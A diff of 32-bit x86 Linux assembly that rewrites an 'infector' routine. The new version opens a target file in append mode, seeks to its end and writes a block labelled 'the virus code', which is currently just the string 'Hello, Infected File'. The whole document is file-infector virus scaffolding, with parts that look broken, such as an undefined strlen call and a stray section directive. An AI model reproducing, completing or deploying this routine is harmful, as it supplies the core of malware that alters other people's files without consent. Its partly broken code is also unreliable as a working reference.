@@ -56,51 +56,67 @@ system_call:
     ret
 
     infector:
-    ; Function argument: filename is passed in ebx
+    ; Save registers that will be used
+    push   ebp
+    mov    ebp, esp
+    sub    esp, 4
 
     ; Print the filename
-    push   ebx               ; push filename pointer
-    call   print_filename    ; call helper function to print filename
-    add    esp, 4            ; clean up stack
+    mov    eax, 4          ; syscall: write
+    mov    ebx, 1          ; file descriptor: stdout
+    mov    ecx, [ebp+8]    ; filename (argument to infector)
+    call   strlen
+    mov    edx,eax
+    int    0x80
 
-    ; Open the file for appending
-    mov    eax, 5            ; SYS_OPEN system call
-    mov    ecx, 0x202        ; O_WRONLY | O_APPEND | O_CREAT
-    int    0x80              ; invoke system call
-    mov    edi, eax          ; save file descriptor to edi
+    ; Open the file (append mode)
+    mov    eax, 5          ; syscall: open
+    mov    ebx, [ebp+8]    ; filename
+    mov    ecx, 0x401      ; flags: O_APPEND | O_WRONLY
+    mov    edx, 0644       ; mode: 0644
+    int    0x80
+    test   eax, eax        ; check if file descriptor is valid
+    js     open_error      ; jump to open_error if error
 
-    ; Check for error (eax will be negative if there's an error)
-    cmp    eax, 0xFFFFFFFF
-    je     open_failed       ; jump if error
+    mov    ebx, eax        ; save file descriptor
 
-    ; Write infection message to file
-    mov    eax, edi          ; file descriptor
-    mov    ebx, infection_msg ; buffer address
-    mov    ecx, strlen(strlen_msg) ; length of infection message
-    mov    edx, 0            ; no additional flags
-    mov    esi, 4            ; SYS_WRITE system call
-    int    0x80              ; invoke system call
+    ; Seek to the end of the file
+    mov eax, 19       ; SYS_LSEEK
+    mov ecx, 0        ; Offset
+    mov edx, 2        ; SEEK_END
+    int 0x80
+
+    ; Write the virus code to the file
+    mov    eax, 4          ; syscall: write
+    mov    ecx, code_start ; message to write (code_start)
+    mov    edx, code_end - code_start  ; message length
+    int    0x80
 
     ; Close the file
-    mov    eax, 6            ; SYS_CLOSE system call
-    mov    ebx, edi          ; file descriptor
-    int    0x80              ; invoke system call
+    mov    eax, 6          ; syscall: close
+    int    0x80
 
-    ; Return to caller
+    jmp    done
+
+open_error:
+    ; Handle open error
+    mov    eax, 1          ; syscall: exit
+    mov    ebx, 0x55       ; exit code
+    int    0x80
+
+done:
+    ; Restore registers
+    mov    esp, ebp
+    pop    ebp
     ret
 
-open_failed:
-    ; Handle error case (print error message, etc.)
-    ; You can implement error handling as per your requirement
-    ret
+code_start:
+    db "Hello, Infected File", 0x0A
 
-print_filename:
-    ; Helper function to print the filename
-    pop    ecx               ; filename pointer
-    mov    edx, ecx          ; length of the filename
-    mov    ebx, 1            ; file descriptor for STDOUT
-    mov    eax, 4            ; SYS_WRITE system call
-    int    0x80              ; invoke system call
-    ret
+code_end:
+
+section .text
+code_size equ code_end - code_start
+
 
     
